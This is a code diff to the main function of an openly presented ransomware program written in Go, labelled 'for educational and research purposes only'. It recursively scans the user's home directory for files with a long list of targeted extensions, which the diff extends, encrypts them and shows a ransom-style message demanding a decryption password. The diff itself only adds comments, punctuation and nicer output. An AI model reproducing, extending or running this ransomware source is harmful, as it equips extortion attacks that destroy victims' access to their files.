@@ -36,6 +36,7 @@ func main() {
 	/*
 		This is the root directory where the encryption
 		should recursively start. `AppData` is excluded.
+		The two \\ are appended to get the correct path.
 	*/
 	rootDir := userHomeDir() + "\\"
 	// Art Banner
@@ -57,9 +58,10 @@ func main() {
 	warn := color.Yellow.Sprint("For educational and research purposes only.\n")
 	// Password Prompt & notice
 	decrypt := color.Magenta.Sprint("All your important files have been encrypted!")
+	// Password Prompt
 	message := color.Magenta.Sprint("Enter decryption password to get your files back:")
 	// Decrypted Files Array:
-	decryptFiles := color.Green.Sprint("\nThe files below have been decrypted")
+	decryptFiles := color.Green.Sprint("\nThe files below have been decrypted!")
 	// Only encrypt files with these file extensions.
 	fileExtensions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
@@ -67,7 +69,7 @@ func main() {
 		"accdb", "sql", "sqlitedb", "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg",
 		"cgm", "tif", "tiff", "nef", "psd", "ai", "svg", "djvu", "m4u", "m3u",
 		"csv", "rtf", "wks", "wk1", "pdf", "dwg", "onetoc2", "snt",
-		"doc", "docx", "xls", "xlsx", "ppt", "dat", "log",
+		"doc", "docx", "xls", "xlsx", "ppt", "dat", "log", "otf", "ttf",
 		"gpg", "aes", "arc", "paq", "bz2", "tbk", "bak", "bac", "tar", "tgz", "gz",
 		"hwp", "62", "sxi", "sti", "sldx", "sldm", "vdi", "vmdk", "vmx",
 		"jar", "java", "rb", "asp", "php", "jsp", "brd", "sch", "dch", "dip", "pl",
@@ -92,6 +94,7 @@ func main() {
 	// Calls `NewFiles` and begins searching for files to encrypt.
 	e := files.NewFiles(rootDir, fileExtensions, size)
 	systemfiles, err := e.ScanToEncrypt()
+	// If there's an error, print it.
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -125,9 +128,12 @@ func main() {
 			enc := encryption.NewEncryption(file, key)
 			enc.DecryptFile()
 		}
+		// Print the decrypted files in a nice format
 		color.Println(decryptFiles)
-		color.Println(encryptedfiles)
-		// Print an error if decryption fails.
+		for _, str := range encryptedfiles {
+			color.Yellow.Printf("- %s\n", str)
+		}
+		// Print an error if decryption fails, or incorrect password.
 	} else {
 		fmt.Println("Decryption Failed. Is the password correct?")
 
